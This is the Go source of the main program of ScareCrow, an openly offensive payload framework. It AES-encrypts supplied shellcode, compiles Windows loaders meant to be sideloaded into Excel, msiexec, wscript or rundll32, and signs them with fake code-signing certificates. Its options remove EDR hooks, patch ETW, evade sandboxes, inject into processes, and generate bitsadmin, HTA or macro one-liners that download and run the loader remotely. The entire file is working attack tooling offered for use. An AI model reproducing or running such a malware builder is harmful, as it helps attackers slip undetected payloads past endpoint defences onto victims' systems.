package main

import (
	"ScareCrow/Cryptor"
	"ScareCrow/Loader"
	"ScareCrow/limelighter"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os/exec"
)

type FlagOptions struct {
	outFile          string
	inputFile        string
	URL              string
	LoaderType       string
	CommandLoader    string
	domain           string
	password         string
	valid            string
	configfile       string
	ProcessInjection string
	ETW              bool
	console          bool
	refresher        bool
	sandbox          bool
}

func options() *FlagOptions {
	outFile := flag.String("O", "", "Name of output file (e.g. loader.js or loader.hta). If Loader is set to dll or binary this option is not required.")
	inputFile := flag.String("I", "", "Path to the raw 64-bit shellcode.")
	console := flag.Bool("console", false, "Only for Binary Payloads - Generates verbose console information when the payload is executed. This will disable the hidden window feature.")
	LoaderType := flag.String("Loader", "binary", `Sets the type of process that will sideload the malicious payload:
[*] binary - Generates a binary based payload. (This type does not benfit from any sideloading)	
[*] control - Loads a hidden control applet - the process name would be rundll32 if -O is specified a JScript loader will be generated.
[*] dll - Generates just a DLL file. Can executed with commands such as rundll32 or regsvr32 with DllRegisterServer, DllGetClassObject as export functions.
[*] excel - Loads into a hidden Excel process using a JScript loader.
[*] msiexec - Loads into MSIexec process using a JScript loader.
[*] wscript - Loads into WScript process using a JScript loader.
`)
	refresher := flag.Bool("unmodified", false, "When enabled will generate a DLL loader that WILL NOT removing the EDR hooks in system DLLs and only use custom syscalls (set to false by default)")
	URL := flag.String("url", "", "URL associated with the Delivery option to retrieve the payload. (e.g. https://acme.com/)")
	CommandLoader := flag.String("delivery", "", `Generates a one-liner command to download and execute the payload remotely:
[*] bits - Generates a Bitsadmin one liner command to download, execute and remove the loader (Compatible with Binary, Control, Excel and Wscript Loaders).
[*] hta - Generates a blank hta file containing the loader along with a MSHTA command execute the loader remotely in the background (Compatible with Control and Excel Loaders). 
[*] macro - Generates an office macro that will download and execute the loader remotely (Compatible with Control, Excel and Wscript Loaders)`)
	domain := flag.String("domain", "", "The domain name to use for creating a fake code signing cert. (e.g. www.acme.com) ")
	password := flag.String("password", "", "The password for code signing cert. Required when -valid is used.")
	ETW := flag.Bool("etw", false, "Enables ETW patching to prevent ETW events from being generated")
	ProcessInjection := flag.String("injection", "", "Enables Process Injection Mode and specify the path to the process to create/inject into (use \\ for the path).")
	configfile := flag.String("configfile", "", "The path to a json based configuration file to generate custom file attributes. This will not use the the default ones.")
	valid := flag.String("valid", "", "The path to a valid code signing cert. Used instead -domain if a valid code signing cert is desired.")
	sandbox := flag.Bool("sandbox", false, `Enables sandbox evasion using IsDomainedJoined calls.`)
	flag.Parse()
	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, URL: *URL, LoaderType: *LoaderType, CommandLoader: *CommandLoader, domain: *domain, password: *password, configfile: *configfile, console: *console, ETW: *ETW, ProcessInjection: *ProcessInjection, refresher: *refresher, valid: *valid, sandbox: *sandbox}
}

func execute(opt *FlagOptions, name string) string {
	bin, _ := exec.LookPath("env")
	var compiledname string
	var cmd *exec.Cmd
	if opt.configfile != "" {
		oldname := name
		name = limelighter.FileProperties(name, opt.configfile)
		cmd = exec.Command("mv", "../"+oldname+"", "../"+name+"")
		err := cmd.Run()
		if err != nil {
			fmt.Printf("error")
		}
	} else {
		name = limelighter.FileProperties(name, opt.configfile)
	}
	if opt.LoaderType == "binary" {
		cmd = exec.Command(bin, "GOROOT_FINAL=/dev/null", "GOOS=windows", "GOARCH=amd64", "go", "build", "-a", "-trimpath", "-ldflags", "-s -w", "-o", ""+name+".exe")
	} else {
		cmd = exec.Command(bin, "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "go", "build", "-a", "-trimpath", "-ldflags", "-w -s", "-o", ""+name+".dll", "-buildmode=c-shared")
	}
	fmt.Println("[*] Compiling Payload")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		fmt.Printf("%s: %s\n", err, stderr.String())
	}
	if opt.LoaderType == "binary" {
		compiledname = name + ".exe"
	} else {
		compiledname = name + ".dll"
	}
	fmt.Println("[+] Payload Compiled")
	limelighter.Signer(opt.domain, opt.password, opt.valid, compiledname)
	return name
}

func main() {
	fmt.Println(` 
  _________                           _________                       
 /   _____/ ____ _____ _______   ____ \_   ___ \_______  ______  _  __
 \_____  \_/ ___\\__  \\_  __ \_/ __ \/    \  \/\_  __ \/  _ \ \/ \/ /
 /        \  \___ / __ \|  | \/\  ___/\     \____|  | \(  <_> )     / 
/_______  /\___  >____  /__|    \___  >\______  /|__|   \____/ \/\_/  
	\/     \/     \/            \/        \/                      
							(@Tyl0us)
	“Fear, you must understand is more than a mere obstacle. 
	Fear is a TEACHER. the first one you ever had.”
	`)
	opt := options()

	if opt.inputFile == "" {
		log.Fatal("Error: Please provide a path to a file containing raw 64-bit shellcode (i.e .bin files)")
	}

	if opt.CommandLoader != "" && opt.URL == "" {
		log.Fatal("Error: Please provide the url the loader will be hosted on in order to generate a delivery command")
	}

	if opt.LoaderType != "dll" && opt.LoaderType != "binary" && opt.LoaderType != "control" && opt.LoaderType != "excel" && opt.LoaderType != "msiexec" && opt.LoaderType != "wscript" {
		log.Fatal("Error: Invalid loader, please select one of the allowed loader types")
	}

	if opt.CommandLoader != "" && opt.CommandLoader != "bits" && opt.CommandLoader != "hta" && opt.CommandLoader != "macro" {
		log.Fatal("Error: Invalid delivery option, please select one of the allowed delivery types")
	}

	if opt.CommandLoader == "hta" && opt.outFile == "" {
		log.Fatal("Error: Please provide the a HTA filename to store the loader in")
	}

	if (opt.CommandLoader == "hta" || opt.CommandLoader == "macro") && (opt.LoaderType == "binary" || opt.LoaderType == "dll") {
		log.Fatal("Error: Binary and DLL loaders are not compatable with this delivery command")
	}

	if opt.outFile != "" && (opt.LoaderType == "binary" || opt.LoaderType == "dll") {
		fmt.Println("[!] -O not needed. This loader type uses the name of the file they are spoofing")
	}

	if opt.LoaderType == "binary" && opt.refresher == true {
		log.Fatal("Error: Can not use the unmodified option with a binary loader")
	}

	if opt.console == true && opt.LoaderType != "binary" {
		log.Fatal("Error: Console mode is only for binary based payloads")
	}

	if opt.domain == "" {
		log.Fatal("Error: Please provide a domain in order to generate a code signing certificate")
	}

	if opt.password == "" && opt.valid != "" {
		log.Fatal("Error: Please provide a password for the valid code signing certificate")
	}

	if opt.ProcessInjection != "" && opt.ETW == true {
		log.Fatal("Error: Currently process injection and ETW bypass is not available together yet. Please try only one of these options")
	}

	var rawbyte []byte
	src, _ := ioutil.ReadFile(opt.inputFile)
	dst := make([]byte, hex.EncodedLen(len(src)))
	hex.Encode(dst, src)
	r := base64.StdEncoding.EncodeToString(dst)
	rawbyte = []byte(r)
	key := Cryptor.RandomBuffer(32)
	iv := Cryptor.RandomBuffer(16)

	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatal(err)
	}
	paddedInput, err := Cryptor.Pkcs7Pad([]byte(rawbyte), aes.BlockSize)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[*] Encrypting Shellcode Using AES Encryption")
	cipherText := make([]byte, len(paddedInput))
	ciphermode := cipher.NewCBCEncrypter(block, iv)
	ciphermode.CryptBlocks(cipherText, paddedInput)
	b64ciphertext := base64.StdEncoding.EncodeToString(cipherText)
	b64key := base64.StdEncoding.EncodeToString(key)
	b64iv := base64.StdEncoding.EncodeToString(iv)
	fmt.Println("[+] Shellcode Encrypted")
	name, filename := Loader.CompileFile(b64ciphertext, b64key, b64iv, opt.LoaderType, opt.outFile, opt.refresher, opt.console, opt.sandbox, opt.ETW, opt.ProcessInjection)
	name = execute(opt, name)
	Loader.CompileLoader(opt.LoaderType, opt.outFile, filename, name, opt.CommandLoader, opt.URL, opt.sandbox)

}
